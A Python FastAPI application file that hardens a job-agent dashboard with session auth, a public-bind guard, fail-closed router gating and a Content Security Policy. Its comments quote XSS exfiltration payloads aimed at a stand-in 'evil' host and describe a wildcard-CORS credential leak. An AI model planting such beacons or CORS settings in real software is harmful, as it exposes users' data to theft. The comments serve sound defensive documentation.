"""FastAPI application factory — Phase 1 reads.

Lazy-import rule: this module (and api.cache / api.schemas / api.deps /
api.routers.*) MUST never import agents.curator or main at startup —
agents/curator.py:57-79 parses the CV on import. Pipeline modules are
therefore imported lazily inside handlers (Phase 1 needs none at all:
all reads go through api.cache, which lazy-loads only
tools.sheet_writer / tools.application_tracker on first use).

Bind rule: serve on 127.0.0.1 by default; a non-local bind requires API_TOKEN
to be set (enforced at import time inside create_app(), and checked against
BOTH the API_HOST env var and uvicorn's own `--host` flag — either one alone
decides the real bind address depending on how the app is started).

Auth rule: browser users log in (api/routers/auth.py — username+password ->
server-side session -> HttpOnly cookie); /api/* require a valid session via
deps.require_token. API_TOKEN stays server-side only (Bearer for
server-to-server calls) and is never exposed to the browser. `GET /` gates
the dashboard: unauthenticated visitors are redirected to /login.html.

Fail-CLOSED rule: auth is attached at the ROUTER level (`_gated`) as well as
per route, so a newly added endpoint is authenticated even if its author
forgets the `Depends(require_token)`. Only api/routers/auth.py is exempt —
/api/auth/login has to be reachable with no session. The same predicate
(`deps.credentials_ok`) also guards /docs + /openapi.json and the directly
navigable /index.html, neither of which any router dependency can reach.

Router layout (one file per group for easy debugging):
   api/deps.py            — CORS origins + session/Bearer auth
   api/ratelimit.py       — sliding-window limiter for /api/auth/login
   api/routers/auth.py    — POST /api/auth/login, POST logout, GET /api/auth/me
   api/routers/liveness.py— GET /api/health/live (unauthenticated probe)
   api/activity.py + api/routers/activity.py — GET /api/activity (actor feed)
   api/mappers.py         — row -> schema converters
   api/routers/health.py  — GET /api/health
   api/routers/jobs.py    — GET /api/jobs, GET /api/jobs/{fp}
   api/routers/stats.py   — GET /api/stats
   api/routers/skills.py  — GET /api/skills (tech_stack demand aggregate)
   api/routers/tracker.py — GET/PATCH /api/tracker
    api/routers/system.py  — POST /api/jobs/refresh
    api/runs.py + api/routers/runs.py — POST/GET /api/scrape (background runs)
    api/routers/cv.py      — GET /api/cv/profile, GET /api/cv/variants (CV Studio reads)
     api/safety.py + api/apply.py + api/routers/apply.py — POST /api/apply/{fp}
      fill-only (mode=review) + Greenhouse-only /intent + /submit (2b split;
      Lever has no submit path)
"""

import os
import sys
import warnings
from contextlib import asynccontextmanager
from pathlib import Path

from fastapi import Depends, FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, RedirectResponse, Response
from fastapi.staticfiles import StaticFiles
from starlette.middleware.base import BaseHTTPMiddleware

from api.deps import bearer_from_request, cors_origins, credentials_ok, require_token
from api.routers import activity, auth, health, jobs, cv, liveness, materials, runs, skills, stats, system, tracker, apply

FRONTEND_DIR = Path(__file__).resolve().parents[1] / "frontend"

_LOCAL_HOSTS = ("127.0.0.1", "localhost", "::1")

# Docs are served by FastAPI itself, so no router dependency can reach them.
# They are gated by default: an unauthenticated scanner that finds the host
# should not also be handed the complete route inventory. A logged-in operator
# still gets Swagger, because the browser sends the session cookie same-origin.
# Set API_DOCS_ENABLED=true to publish them again.
_DOCS_PATHS = frozenset({"/docs", "/docs/oauth2-redirect", "/redoc", "/openapi.json"})

# The dashboard shell is served by the StaticFiles mount, which bypasses the
# `GET /` route entirely — naming the file directly would otherwise hand the
# UI to someone with no session.
_DASHBOARD_PATHS = frozenset({"/index.html", "/index.htm"})


def _docs_enabled() -> bool:
    return (os.getenv("API_DOCS_ENABLED") or "").strip().lower() in ("1", "true", "yes", "on")


# --- Content Security Policy --------------------------------------------------
#
# The comment that used to sit on the header below said a CSP was deliberately
# not shipped because the dashboard relies on inline <script>/<style> blocks and
# a strict policy would break the UI. That was true as far as it went, but it
# treated "cannot be strict" as "cannot exist", and gave up everything a CSP does
# that has nothing to do with inline script:
#
#   connect-src 'self'      an injected script cannot POST stolen data to an
#                           attacker origin. Exfiltration is the entire point of
#                           XSS, and this blocks the last step of it.
#   img-src 'self' data: blob:
#                           blocks <img src="//evil/?d=..."> beacons, which need
#                           no script execution at all — and were the exact
#                           channel this repo's own XSS tests use to prove an
#                           injected node went live.
#   script-src 'self'       blocks <script src="//evil/x.js"> even with
#                           'unsafe-inline' allowed, so a payload cannot fetch a
#                           second stage.
#   object-src 'none'       no plugin/embed surface at all.
#   base-uri 'self'         blocks <base href> injection, which would otherwise
#                           silently rewrite every relative URL on the page —
#                           including every API call this dashboard makes.
#   form-action 'self'      blocks a form being retargeted to an attacker.
#   frame-ancestors 'self'  clickjacking; the modern form of the X-Frame-Options
#                           header set below, kept alongside it for old browsers.
#
# script-src carries NO 'unsafe-inline', which is the part that actually matters:
# an injected inline payload cannot execute, so this policy prevents the injection
# from starting rather than only limiting what a successful one can do. That is
# only true because the last inline script in the frontend — one IIFE at the end
# of login.html's <body> — was extracted to frontend/js/login.js. It sits in the
# same position as a plain <script src>, so it parses and runs at the same point,
# and tests/e2e loads login.html in jsdom with resources:'usable', which really
# fetches and executes external scripts, so the extraction is covered rather than
# assumed. If an inline script is ever added back, script-src must be loosened to
# serve it — tests/test_content_security_policy.py fails instead, which is the
# point: that trade should be a deliberate decision, not a silent regression.
#
# style-src DOES still carry 'unsafe-inline', and cannot drop it yet: there are
# 43 style="..." attributes across index.html, login.html and six JS template
# literals, and markup style attributes are governed by style-src. The residual
# risk is much smaller than inline script — CSS cannot execute — and the main
# exfiltration channel CSS does offer (background:url() to an attacker origin) is
# already closed by img-src 'self' data: blob:. Replacing those 43 attributes with
# classes would allow tightening it; that is a frontend refactor with no security
# deadline attached.
#
# Every allowance was derived by enumerating what the frontend actually loads,
# not guessed, and tests/test_content_security_policy.py re-runs that enumeration
# so the policy and the frontend cannot drift apart silently:
#
#   fonts.googleapis.com    Google Fonts stylesheet, linked from index.html:8-10
#   fonts.gstatic.com       and login.html:7-9; the font files themselves
#   blob:                   autoApply.js:333 renders the review screenshot
#                           through URL.createObjectURL when the session cookie
#                           will not ride along on a cross-origin <img>
#   data:                   allowed for inline SVG/CSS imagery; nothing uses it
#                           today, and it costs nothing to permit
#   'self' for connect-src  Caddy reverse-proxies the UI and the API on one
#                           origin, and api.js baseUrl() returns
#                           window.location.origin whenever the page was served
#                           over http(s). The http://127.0.0.1:8000 fallback in
#                           api.js only applies to a file:// page, which no
#                           server delivers and which therefore carries no CSP.
#
# One caveat worth knowing: api.js also honours a `rja_api_base` localStorage
# override for pointing the UI at a different API origin. An enforcing
# connect-src 'self' blocks that. It is a development convenience, and the
# documented deployments never need it; CSP_MODE=report-only is the way to check
# before enforcing if you do rely on it.

_CSP_DIRECTIVES = (
    ("default-src", "'self'"),
    ("script-src", "'self'"),
    ("style-src", "'self' 'unsafe-inline' https://fonts.googleapis.com"),
    ("font-src", "'self' https://fonts.gstatic.com"),
    ("img-src", "'self' data: blob:"),
    ("connect-src", "'self'"),
    ("form-action", "'self'"),
    ("frame-ancestors", "'self'"),
    ("object-src", "'none'"),
    ("base-uri", "'self'"),
)

CONTENT_SECURITY_POLICY = "; ".join(
    f"{name} {value}" for name, value in _CSP_DIRECTIVES
)


def _csp_header_name() -> str:
    """Which CSP header to send: enforcing, Report-Only, or "" for none.

    `CSP_MODE=report-only` sends Content-Security-Policy-Report-Only, which the
    browser evaluates and reports violations for WITHOUT blocking anything. That
    is the correct way to check a policy against a real browser before enforcing
    it, and it is the escape hatch if a policy that was verified here still
    breaks something in a browser this sandbox cannot run.

    `CSP_MODE=off` sends neither header. An escape hatch, not a recommendation:
    it removes exfiltration and clickjacking protection along with the noise.
    """
    mode = (os.getenv("CSP_MODE") or "enforce").strip().lower()
    if mode in ("off", "disabled", "none"):
        return ""
    if mode in ("report-only", "report_only", "reportonly"):
        return "Content-Security-Policy-Report-Only"
    if mode not in ("enforce", "on", "true", "1"):
        warnings.warn(
            f"CSP_MODE={mode!r} is not one of enforce/report-only/off; "
            "enforcing the policy. An unrecognised mode failing open would be "
            "worse than a typo being loud.",
            RuntimeWarning,
            stacklevel=2,
        )
    return "Content-Security-Policy"


def _argv_host() -> str:
    """The host uvicorn was actually told to bind, from sys.argv, or "".

    Handles both `--host 0.0.0.0` and `--host=0.0.0.0`. uvicorn parses its CLI
    before importing the app module, so sys.argv is already complete when
    create_app() runs.
    """
    argv = list(sys.argv or [])
    for index, arg in enumerate(argv):
        if arg == "--host" and index + 1 < len(argv):
            return argv[index + 1].strip()
        if arg.startswith("--host="):
            return arg.split("=", 1)[1].strip()
    return ""


def _enforce_bind_guard() -> None:
    """Refuse a non-local bind without API_TOKEN (import-time, both entry points).

    Checks API_HOST *and* uvicorn's `--host`. Reading only the env var left the
    documented run command — `uvicorn api.app:app --host 0.0.0.0` with API_HOST
    unset — passing the guard while binding on every interface, which combined
    with `open_access()` (no users, no token) meant a fully public API.
    Localhost default stays open for dev.
    """
    host = (os.getenv("API_HOST", "127.0.0.1").strip() or "127.0.0.1")
    argv_host = _argv_host()
    candidates = [host] + ([argv_host] if argv_host else [])
    non_local = any(candidate not in _LOCAL_HOSTS for candidate in candidates)
    if non_local and not (os.getenv("API_TOKEN") or "").strip():
        raise RuntimeError(
            "Refusing non-local bind without API_TOKEN set. "
            "Bind 127.0.0.1 (default) or set API_TOKEN. "
            f"(saw API_HOST={host!r}, --host={argv_host or 'unset'!r})"
        )


class _GateMiddleware(BaseHTTPMiddleware):
    """Fail-closed gates for paths that no router dependency can reach.

    Runs before routing, so it also covers 404s and the static mount. Adds the
    baseline security headers on EVERY response so the app is not silently
    unprotected when deployed without Caddy in front of it.
    """

    async def dispatch(self, request: Request, call_next):
        path = request.url.path

        if (path in _DOCS_PATHS and not _docs_enabled()) or (
            path in _DASHBOARD_PATHS and request.method == "GET"
        ):
            if not credentials_ok(request, bearer_from_request(request)):
                if path in _DASHBOARD_PATHS:
                    return RedirectResponse("/login.html", status_code=302)
                return Response(
                    status_code=401,
                    media_type="application/json",
                    content='{"detail":"Unauthorized"}',
                )

        response = await call_next(request)

        # See _CSP_DIRECTIVES for what this blocks, what it deliberately still
        # allows ('unsafe-inline', and why), and how every allowance was derived.
        csp_header = _csp_header_name()
        if csp_header:
            response.headers.setdefault(csp_header, CONTENT_SECURITY_POLICY)
        response.headers.setdefault("X-Content-Type-Options", "nosniff")
        response.headers.setdefault("X-Frame-Options", "SAMEORIGIN")
        response.headers.setdefault("Referrer-Policy", "strict-origin-when-cross-origin")
        return response


def _include_gated(app: FastAPI, module) -> None:
    """Include one router with auth attached at the ROUTER level.

    Every route in these routers already repeats `Depends(require_token)` and
    all 24 were correct — but per-route auth fails OPEN: one forgotten line on
    a new route ships a public endpoint. Gating at include time makes the safe
    behaviour the default. `apply.py` keeps its stricter per-route
    `require_apply_token` on top; both run and the stricter one still wins.

    IMPORTANT — this must go through `include_router(dependencies=...)`, NOT by
    appending to `module.router.dependencies`. This FastAPI version resolves
    included routers lazily (`_IncludedRouter`), and mutating the list after
    construction is a silent no-op: the routes register, the app starts, and
    every request is served UNGATED. Declaring the dependency at construction
    or at include time both work; mutation does not. There is a test
    (`test_router_level_gate_covers_a_route_that_forgets_its_dependency`) that
    fails closed if this ever regresses.
    """
    app.include_router(module.router, dependencies=[Depends(require_token)])


# `auth` and `liveness` are deliberately absent: /api/auth/login must stay
# reachable logged out, and an unauthenticated probe needs /api/health/live to
# tell "up but not signed in" apart from "down".
_GATED_ROUTERS = (
    health, jobs, stats, skills, tracker, system, runs, materials, cv, apply, activity
)

# Included with NO router-level auth dependency.
_OPEN_ROUTERS = (auth, liveness)


@asynccontextmanager
async def _lifespan(app: FastAPI):
    """Announce the auth posture once at startup.

    `open_access()` (no API_TOKEN AND no users) serves the ENTIRE API with no
    credentials. That is a deliberate localhost convenience, but a forgotten
    `create_user.py` on a public host means an open API — so the condition is
    shouted about at every start instead of failing silently. It is a warning,
    not a refusal: refusing would break the documented fresh-clone developer
    experience.
    """
    from api.auth import count_users, open_access

    try:
        is_open = open_access()
    except Exception:
        is_open = False
    if is_open:
        warnings.warn(
            "AUTH OPEN ACCESS: no users exist and API_TOKEN is unset, so every "
            "/api/* route is currently UNAUTHENTICATED. This is only safe on a "
            "loopback bind. Before exposing this host, run "
            "`python create_user.py <username>` and set API_TOKEN.",
            stacklevel=2,
        )
    else:
        print(
            "[api] auth enforced "
            f"(users={count_users()}, "
            f"api_token={'set' if (os.getenv('API_TOKEN') or '').strip() else 'unset'})",
            flush=True,
        )
    yield


def create_app() -> FastAPI:
    _enforce_bind_guard()

    # The docs routes are ALWAYS created — disabling them here would 404 for a
    # logged-in operator too, since FastAPI would never register the paths.
    # Access is decided by _GateMiddleware instead: anonymous -> 401, valid
    # session (the browser sends the HttpOnly cookie same-origin) -> Swagger.
    # API_DOCS_ENABLED=true makes them public again.
    app = FastAPI(
        title="remote-job-agent API (Phase 1 reads)",
        docs_url="/docs",
        redoc_url="/redoc",
        openapi_url="/openapi.json",
        lifespan=_lifespan,
    )

    app.add_middleware(_GateMiddleware)
    app.add_middleware(
        CORSMiddleware,
        allow_origins=cors_origins(),
        # Auth is an HttpOnly COOKIE now, so credentials must be allowed for a
        # cross-origin dashboard to authenticate at all. That is only safe
        # because the origin list is explicit — and the second half of that
        # sentence used to be a lie. This comment claimed "Starlette rejects '*'
        # combined with credentials anyway". It does not. Starlette computes
        # `preflight_explicit_allow_origin = not allow_all_origins or
        # allow_credentials`, so "*" WITH credentials makes it REFLECT the
        # caller's Origin and send Access-Control-Allow-Credentials: true.
        # Verified live: with API_CORS_ORIGINS=*, a request from
        # `Origin: https://evil.example` got that origin echoed back and read
        # /api/jobs with the operator's cookie attached.
        # `cors_origins()` now filters "*" out, which is what makes the
        # invariant here true rather than merely asserted. The default stays
        # localhost-only; API_CORS_ORIGINS widens it to named origins only.
        allow_credentials=True,
        allow_methods=["GET", "POST", "PUT", "PATCH", "OPTIONS"],
        allow_headers=["Content-Type", "Authorization"],
    )

    # One include per group — comment out a single line to isolate a bug.
    # `auth` is included ungated: /api/auth/login must stay reachable logged out.
    for module in _OPEN_ROUTERS:
        app.include_router(module.router)
    for module in _GATED_ROUTERS:
        _include_gated(app, module)

    @app.get("/", include_in_schema=False)
    def root_gate(request: Request):
        """Dashboard entry point: valid session (or fresh open local dev) gets
        the dashboard; anyone else is redirected to the login page. The API
        stays the hard gate — this only shapes the UX.
        """
        from api.auth import open_access, session_user

        if session_user(request) is not None or open_access():
            index = FRONTEND_DIR / "index.html"
            if index.is_file():
                return FileResponse(str(index))
            return {"detail": "Dashboard frontend missing (frontend/index.html)"}
        return RedirectResponse("/login.html", status_code=302)

    # Serve the dashboard UI same-origin so file:// CORS ("null" origin) is
    # never an issue: open http://127.0.0.1:8000/ instead of index.html.
    # Mounted LAST so /api/*, /docs, and the / gate above always win.
    if FRONTEND_DIR.is_dir():
        app.mount("/", StaticFiles(directory=str(FRONTEND_DIR), html=True), name="frontend")

    return app


app = create_app()


if __name__ == "__main__":  # pragma: no cover
    import uvicorn

    # Reuse the import-time guard so both entry points agree; create_app()
    # already enforced it, this just surfaces the same error before uvicorn
    # starts for `python api/app.py` users.
    _enforce_bind_guard()
    host = os.getenv("API_HOST", "127.0.0.1").strip() or "127.0.0.1"
    port = int(os.getenv("API_PORT", "8000").strip() or "8000")
    uvicorn.run("api.app:app", host=host, port=port)
